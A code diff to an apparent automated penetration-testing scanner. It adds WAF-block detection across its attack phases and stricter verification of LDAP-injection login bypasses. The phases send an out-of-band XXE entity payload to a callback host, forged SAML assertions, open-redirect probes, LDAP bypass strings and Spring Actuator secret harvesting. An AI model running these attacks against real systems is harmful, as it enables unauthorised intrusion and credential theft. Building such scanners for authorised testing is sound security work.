@@ -7693,6 +7693,33 @@ def run_post_param_discovery(domain: str,
 
 
 # ── NEW: JWT Audit ──────────────────────────────────────────────────────────────
+
+def _check_waf_block(findings_dir: str, url: str, response, already_recorded: bool) -> bool:
+    """Fix Round 3 (Critical #2): shared bot-management/WAF-block coverage
+    check for every Task-9 phase issuing live requests via
+    tls_impersonation.get_client(...). tls_impersonation.detect_bot_management
+    / record_waf_block were fully implemented and tested (Task 2) but never
+    called anywhere — a phase silently reporting zero findings after a
+    Cloudflare/Akamai/F5 403/429/503 mid-scan is indistinguishable from a
+    genuinely clean target without this.
+
+    Recorded at MOST ONCE per phase (threaded via the `already_recorded`
+    flag callers pass back in on every call) -- the goal is operator
+    visibility into "this phase got blocked", not an exhaustive per-request
+    WAF fingerprint log. `response` may be None (a module's result object
+    doesn't always carry the raw HTTP response) -- degrades to a no-op.
+    Returns the (possibly updated) already_recorded flag for the caller to
+    thread through its loop."""
+    if already_recorded or response is None:
+        return already_recorded
+    import tls_impersonation
+    product = tls_impersonation.detect_bot_management(response)
+    if product:
+        tls_impersonation.record_waf_block(findings_dir, url, product)
+        return True
+    return already_recorded
+
+
 def run_jwt_audit(domain: str) -> bool:
     """
     Collect JWTs from recon artifacts and run jwt_tool:
@@ -7852,8 +7879,10 @@ def run_xxe_hunt(domain: str) -> bool:
     confirmed, candidates = 0, 0
     out_path = os.path.join(xxe_dir, "findings.txt")
     oob_sent = 0
+    waf_recorded = False
     for url in _collect_urls_from_file(urls_file, strip_query=False, limit=100):
         result = xxe_hunt.probe_content_type_swap(client, url, {})
+        waf_recorded = _check_waf_block(findings_dir, url, result.response, waf_recorded)
         if result.verdict == "confirmed":
             confirmed += 1
             with open(out_path, "a") as f:
@@ -7880,7 +7909,8 @@ def run_xxe_hunt(domain: str) -> bool:
                 f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{session.url}/xxe-callback">]>'
                 "<root>&xxe;</root>"
             )
-            client.post(url, headers={"Content-Type": "application/xml"}, data=oob_payload)
+            oob_response = client.post(url, headers={"Content-Type": "application/xml"}, data=oob_payload)
+            waf_recorded = _check_waf_block(findings_dir, url, oob_response, waf_recorded)
             oob_sent += 1
 
     if session is not None and session.token and oob_sent:
@@ -7917,6 +7947,7 @@ def run_xxe_hunt(domain: str) -> bool:
     if upload_urls:
         for endpoint in upload_urls[:20]:
             upload_result = xxe_hunt.probe_upload_xxe(client, endpoint, doc_type="svg")
+            waf_recorded = _check_waf_block(findings_dir, endpoint, upload_result.response, waf_recorded)
             upload_probed += 1
             if upload_result.verdict == "confirmed":
                 confirmed += 1
@@ -7963,9 +7994,11 @@ def run_open_redirect_hunt(domain: str) -> bool:
 
     confirmed = 0
     out_path = os.path.join(redirects_dir, "findings.txt")
+    waf_recorded = False
     for url in _collect_urls_from_file(urls_file, strip_query=False, limit=200):
         for param in open_redirect_hunt.extract_redirect_params(url):
             result = open_redirect_hunt.probe_url(client, url, param, attacker_host)
+            waf_recorded = _check_waf_block(findings_dir, url, result.response, waf_recorded)
             if result.confirmed:
                 confirmed += 1
                 with open(out_path, "a") as f:
@@ -8026,9 +8059,11 @@ def run_saml_xsw(domain: str) -> bool:
     resource_url = os.environ.get("VAPT_SAML_PROTECTED_RESOURCE", "")
 
     confirmed_variants = []
+    waf_recorded = False
     for name, xml in saml_xsw_tester.generate_xsw_variants(assertion_xml).items():
         forged_b64 = base64.b64encode(xml.encode()).decode()
         result = saml_xsw_tester.confirm_new_session(client, acs_url, forged_b64, resource_url)
+        waf_recorded = _check_waf_block(findings_dir, acs_url, result.response, waf_recorded)
         if result.confirmed:
             confirmed_variants.append(name)
 
@@ -8064,6 +8099,7 @@ def run_actuator_probe(domain: str) -> bool:
     os.makedirs(out_dir, exist_ok=True)
     out_path = os.path.join(out_dir, "findings.txt")
     confirmed = candidates = jolokia_reachable = 0
+    waf_recorded = False
 
     for url in actuator_urls:
         if "jolokia" in url.lower():
@@ -8075,6 +8111,7 @@ def run_actuator_probe(domain: str) -> bool:
             # note and never auto-escalated to a confirmed/candidate finding
             # on its own.
             jolokia_result = springboot_actuator_probe.check_jolokia_reachability(client, url)
+            waf_recorded = _check_waf_block(findings_dir, url, jolokia_result.response, waf_recorded)
             if jolokia_result.reachable:
                 jolokia_reachable += 1
                 with open(out_path, "a") as f:
@@ -8083,6 +8120,7 @@ def run_actuator_probe(domain: str) -> bool:
 
         if "env" in url:
             resp = client.get(url)
+            waf_recorded = _check_waf_block(findings_dir, url, resp, waf_recorded)
             try:
                 secrets = springboot_actuator_probe.parse_actuator_env_secrets(resp.json())
             except Exception:
@@ -8092,6 +8130,7 @@ def run_actuator_probe(domain: str) -> bool:
                 with open(out_path, "a") as f:
                     f.write(f"[ACTUATOR-ENV-SECRET-CONFIRMED] {url} | {hit}\n")
         spel_result = springboot_actuator_probe.check_spel_injection(client, url)
+        waf_recorded = _check_waf_block(findings_dir, url, spel_result.response, waf_recorded)
         if spel_result.verdict == "confirmed":
             confirmed += 1
             with open(out_path, "a") as f:
@@ -8119,8 +8158,53 @@ _LDAP_AUTH_FAILURE_MARKERS = (
     "invalid credentials", "login failed", "access denied", "incorrect password",
 )
 
+# Fix Round 3 (Critical #1): a bare "a Set-Cookie header appeared that wasn't
+# on the baseline" is gameable by ANY unrelated cookie a page happens to set —
+# a Google Analytics _ga cookie, a CSRF token minted fresh on every page load
+# including a failed login, etc. Explicit reject-list checked FIRST (a name
+# match here means "definitely not session evidence", full stop, even though
+# some of these substrings — e.g. "token" in XSRF-TOKEN — would otherwise also
+# match the session-shaped marker list below).
+_LDAP_NON_AUTH_COOKIE_NAME_MARKERS = (
+    "_ga", "_gid", "_gat", "_fbp", "_fbc", "csrftoken", "csrf-token", "csrf_token",
+    "xsrf-token", "xsrf_token",
+)
+# Session/auth-cookie-shaped name markers (case-insensitive substring match).
+# Covers JSESSIONID, PHPSESSID, ASP.NET_SessionId (all contain "sess"), plus
+# generic "sid"/"auth"/"token"-named session cookies.
+_LDAP_SESSION_COOKIE_NAME_MARKERS = ("sess", "sid", "auth", "token")
 
-def _ldap_bypass_verdict(response, baseline) -> str:
+
+def _ldap_cookie_name(set_cookie_header: str) -> str:
+    """The cookie NAME (before '=') out of a raw Set-Cookie header value,
+    lowercased for marker matching."""
+    return set_cookie_header.split("=", 1)[0].strip().lower()
+
+
+def _ldap_looks_like_session_cookie(name: str) -> bool:
+    """True only for cookie names that plausibly carry session/auth state.
+
+    Explicitly rejects known analytics/CSRF cookie names FIRST — a CSRF token
+    is minted on every page load, including a failed one, and an analytics
+    cookie has nothing to do with auth state, so neither is evidence of a new
+    session regardless of whether its name also happens to contain a
+    session-shaped substring (e.g. "token" in XSRF-TOKEN)."""
+    lname = name.lower()
+    if any(marker in lname for marker in _LDAP_NON_AUTH_COOKIE_NAME_MARKERS):
+        return False
+    return any(marker in lname for marker in _LDAP_SESSION_COOKIE_NAME_MARKERS)
+
+
+def _ldap_response_looks_like_failure(response) -> bool:
+    """Same un-failed shape check _ldap_bypass_verdict applies to the initial
+    bypass response, reused to sanity-check the verification follow-up."""
+    text = (response.text or "").lower()
+    if response.status_code >= 400 or response.status_code in (301, 302, 303, 307, 308):
+        return True
+    return any(marker in text for marker in _LDAP_AUTH_FAILURE_MARKERS)
+
+
+def _ldap_bypass_verdict(client, url: str, response, baseline) -> str:
     """Classify an always-true LDAP filter-injection payload's response
     against the known-probe baseline as "confirmed", "candidate", or "clean".
 
@@ -8135,13 +8219,28 @@ def _ldap_bypass_verdict(response, baseline) -> str:
     Location signal, same reasoning nomore403_audit documents for its own
     30x exclusion).
 
-    Tiering (never auto-confirm on a weak signal alone, same discipline as
-    saml_xsw_tester.confirm_new_session):
-      - "confirmed" — response looks un-failed AND a session cookie was
-        issued that the baseline never had (a genuinely new session is the
-        same strong proof tier confirm_new_session requires via Set-Cookie).
+    Tiering (never auto-confirm on a weak signal alone). Fix Round 3: a
+    Set-Cookie header appearing that wasn't on the baseline is NOT, by
+    itself, proof of anything — an unrelated analytics/CSRF cookie set on
+    every page load (failed or not) would satisfy that check trivially. This
+    now genuinely mirrors saml_xsw_tester.confirm_new_session's discipline:
+    that function never trusts a bare Set-Cookie either, it REPLAYS the
+    cookie against a real protected-resource URL and only confirms if that
+    follow-up request reflects the forged identity. There is no equivalent
+    "protected resource" for a login/search endpoint, so the follow-up here
+    re-fetches the SAME `url` with the new cookie attached and requires the
+    result to no longer look like the failure-shaped baseline.
+      - "confirmed" — response looks un-failed AND a NEW cookie was issued
+        whose NAME looks like a real session/auth cookie (not a known
+        analytics/CSRF cookie) AND re-fetching `url` with that cookie
+        attached produces a response that itself does not look like the
+        failure-shaped baseline (the actual "does this cookie grant a
+        genuinely different, authenticated-shaped response" proof).
       - "candidate" — response looks un-failed (2xx, no failure markers) but
-        without corroborating session evidence — a real lead, not proof.
+        without corroborating, VERIFIED session evidence (no new cookie, a
+        non-session-shaped/reject-listed cookie name, or a session-shaped
+        cookie whose follow-up request still looks like a failure) — a real
+        lead, not proof.
       - "clean" — baseline didn't look like a failure to begin with (nothing
         to bypass), or the response still looks like a failure/error/redirect.
     """
@@ -8162,10 +8261,29 @@ def _ldap_bypass_verdict(response, baseline) -> str:
 
     baseline_cookie = dict(baseline.headers).get("Set-Cookie")
     response_cookie = dict(response.headers).get("Set-Cookie")
-    if response_cookie and not baseline_cookie:
-        return "confirmed"
+    new_cookie_header = response_cookie if (response_cookie and not baseline_cookie) else None
+    if not new_cookie_header:
+        return "candidate"
 
-    return "candidate"
+    cookie_name = _ldap_cookie_name(new_cookie_header)
+    if not _ldap_looks_like_session_cookie(cookie_name):
+        # Either a known non-auth cookie (analytics/CSRF — explicitly not
+        # counted as any signal) or an ambiguous name that doesn't look like
+        # a session cookie either way. The response itself already looked
+        # un-failed, so this is still a lead, just not a verified one.
+        return "candidate"
+
+    # Session-cookie-SHAPED name is necessary but not sufficient -- verify it
+    # actually grants a materially different, non-failure-shaped response by
+    # re-fetching the SAME login/search url with it attached (mirrors
+    # confirm_new_session's own follow-up-request discipline: a Set-Cookie
+    # header alone is never proof).
+    session_cookie = new_cookie_header.split(";")[0]
+    followup = client.get(url, cookies={"raw": session_cookie})
+    if _ldap_response_looks_like_failure(followup):
+        return "candidate"
+
+    return "confirmed"
 
 
 def run_ldap_injection(domain: str) -> bool:
@@ -8218,8 +8336,10 @@ def run_ldap_injection(domain: str) -> bool:
     bypass_confirmed = 0
     bypass_candidates = 0
     out_path = os.path.join(ldap_dir, "findings.txt")
+    waf_recorded = False
     for url in login_urls:
         baseline = client.get(url, params={param: "baseline_probe_value"})
+        waf_recorded = _check_waf_block(findings_dir, url, baseline, waf_recorded)
 
         result = ldap_injection_tester.run_blind_oracle(client, url, param, baseline)
         if result.confirmed:
@@ -8233,6 +8353,7 @@ def run_ldap_injection(domain: str) -> bool:
         # exploitability — so this is always a lead, never an auto-confirm.
         for payload in ldap_injection_tester.build_rfc4515_fuzz_payloads():
             fuzz_response = client.get(url, params={param: payload})
+            waf_recorded = _check_waf_block(findings_dir, url, fuzz_response, waf_recorded)
             if ldap_injection_tester._looks_different_from(fuzz_response, baseline):
                 fuzz_candidates += 1
                 with open(out_path, "a") as f:
@@ -8245,7 +8366,8 @@ def run_ldap_injection(domain: str) -> bool:
         # _ldap_bypass_verdict's docstring for the confirmed/candidate tiering.
         for payload in ldap_injection_tester.build_always_true_bypass_payloads(param):
             bypass_response = client.get(url, params={param: payload})
-            verdict = _ldap_bypass_verdict(bypass_response, baseline)
+            waf_recorded = _check_waf_block(findings_dir, url, bypass_response, waf_recorded)
+            verdict = _ldap_bypass_verdict(client, url, bypass_response, baseline)
             if verdict == "confirmed":
                 bypass_confirmed += 1
                 with open(out_path, "a") as f:
